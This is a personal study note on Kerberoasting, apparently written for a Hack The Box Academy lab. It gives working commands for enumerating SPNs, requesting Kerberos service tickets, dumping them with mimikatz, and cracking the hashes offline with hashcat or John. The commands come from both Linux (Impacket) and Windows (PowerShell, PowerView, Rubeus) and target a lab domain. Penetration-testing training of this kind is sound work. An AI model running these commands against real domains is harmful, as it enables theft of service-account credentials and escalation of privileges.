academy link:https://academy.hackthebox.com/module/143/section/1274

> [!tip]
> If you want **fastest workflow on Windows**, use **Rubeus** → it skips `.kirbi` and outputs crack-ready hashes.  
> Jump: [[#with Rubeus]]

> **windows:

| Phase                    | Command                                                       | Description                            |
| ------------------------ | ------------------------------------------------------------- | -------------------------------------- |
| **Enumerate SPNs**       | `setspn.exe -Q */*`                                           | List all SPNs registered in the domain |
|                          | `.\Rubeus.exe kerberoast /stats`                              | Show kerberoastable accounts           |
| **Request TGS**          | `.\Rubeus.exe asktgs /user:<user> /rc4:<hash>`                | Request TGS using RC4 key              |
|                          | `New-Object KerberosRequestorSecurityToken "<SPN>"`           | Manually request TGS ticket            |
| **Export Ticket / Hash** | `mimikatz kerberos::list /export`                             | Dump/export `.kirbi` tickets           |
|                          | `.\Rubeus.exe kerberoast /nowrap /outfile:C:\Temp\hashes.txt` | Export crack-ready hashes directly     |
> cracking:

|Tool|Command|Description|
|---|---|---|
|**John the Ripper**|`john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs`|Crack TGS (etype 23)|
|**Hashcat (RC4)**|`hashcat -m 13100 hash.txt wordlist.txt`|Crack RC4-HMAC TGS hash|
|**Hashcat (AES128)**|`hashcat -m 19600 hash.txt wordlist.txt`|Crack AES128 TGS hash|
|**Hashcat (AES256)**|`hashcat -m 19700 hash.txt wordlist.txt`|Crack AES256 TGS hash|
|**Hashcat (AS-REP)**|`hashcat -m 18200 hash.txt wordlist.txt`|Crack AS-REP roast hashes|
## From linux:

|Phase|Command|Description|
|---|---|---|
|**Enumerate SPNs**|`GetUserSPNs.py domain/user:pass -dc-ip <IP>`|List SPNs in domain|
|**Request TGS**|`GetUserSPNs.py ... -request`|Request TGS tickets for SPNs|
|**Export Ticket / Hash**|`impacket-ticketConverter ticket.kirbi ticket.ccache`|Convert `.kirbi` ↔ `.ccache`|
||`python3 kirbi2john.py ticket.kirbi`|Convert ticket → crackable format|

For this we need:
- a set of valid credentials
- SPN of that user
- IP of the domain controller
any domain user can request a Kerberoas ticket

1. getting SPNs
	```shell
# syntax example
GetUserSPNs.py -dc-ip 172.16.5.5 Domain/username:password

# filled example
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend:password
```

2. now we have SPNs, we can request  TGS tickets by simply adding `-request` flag:
	```shell
# getting all TGS tickets possible
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

# request ticket of particular user:
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

# best practice is to save tickets to an output file:
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```
***--output argument flag output in john and hashcat ready format.***

3. now we have tickets , we can try to crack them offline by hashcat or John:
```shell 
# syntax example:
hashcat -m 13100 <ticket_file_name> <wordlist>

# filled example:
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```
## From windows:
academy link: https://academy.hackthebox.com/module/143/section/1423

| Phase                    | Command                                                       | Description                              |
| ------------------------ | ------------------------------------------------------------- | ---------------------------------------- |
| **Enumerate SPNs**       | `setspn.exe -Q */*`                                           | List all SPNs registered in the domain   |
|                          | `.\Rubeus.exe kerberoast /stats`                              | Show kerberoastable accounts             |
| **Request TGS**          | `.\Rubeus.exe asktgs /user:<user> /rc4:<hash>`                | Request TGS using RC4 key                |
|                          | `New-Object KerberosRequestorSecurityToken "<SPN>"`           | Manually request TGS ticket (powershell) |
| **Export Ticket / Hash** | `mimikatz kerberos::list /export`                             | Dump/export `.kirbi` tickets             |
|                          | `.\Rubeus.exe kerberoast /nowrap /outfile:C:\Temp\hashes.txt` | Export crack-ready hashes directly       |
#### manually:
READ TIP FIRST AT THE END OF THIS PROCESS.

1. enumerating SPNs:
```cmd
setspn.exe -Q */* 
```

2. now we can request TGS tickets from powershell:
 ```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
pulling all tickets: 
```powershell
# try adding .\ ...becuase its powershell command.

setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

3. now tickets are loadded...we can you mimikatz to extract them out from the memory:
 ```cmd
 mimikatz.exe
 
kerberos::list /export  
```
*If we do not specify the `base64 /out:true` command, Mimikatz will extract the tickets and write them to `.kirbi` files.*

4. preparing for base64 Blob (the base64 out we got from mimikatz)on our host kali:
```shell
# it will output base64 in single line:
echo "<base64 blob>" |  tr -d \\n 
```

5.  We can place the above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility.
```shell
cat encoded_file | base64 -d > sqldev.kirbi
```

6. Next, we can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the `kirbi2john.py` tool to extract the Kerberos ticket from the TGS file.
```shell 
python2.7 kirbi2john.py sqldev.kirbi
```
This will create a file called `crack_file`

7. modifying crack_file for hashcat:
```shell
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

8. now we can use hashcat to crack this hash:
```shell
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

> [!TIP]
> If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.
#### automated/with tools:

checking ticket encryption type:
```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
###### using powerview:
1. importing powerview:
```powershell
Import-Module .\PowerView.ps1
```

2. requesting spn with samname in more formatted way:
```powershell
Get-DomainUser * -spn | select samaccountname
```

3.  now we can specify the user and get TGS ticket in hashcat format:
```powershell
# this command will just print the ticket in the termial in the output
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# saving ticket to a csv file
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

4.  viewing the .csv we just generated:
```powershell
cat .\ilfreight_tgs.csv
```

###### with Rubeus:

checking stats:
```powershell
.\Rubeus.exe kerberoast /stats
```

focusing on high value targets first:
```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

requesting ticket for a specific user:
```powershell-session
.\Rubeus.exe kerberoast /user:testspn /nowrap

# this command allows us to save the tgs..no need to run mimikatz and then kirbi2john
.\Rubeus.exe kerberoast /user:testspn /nowrap /outfile:C:\Temp\hashes.txt
```

now we can directly feed the output file to john (--format=kirbi5tgs)or hashcat(-m 13100)


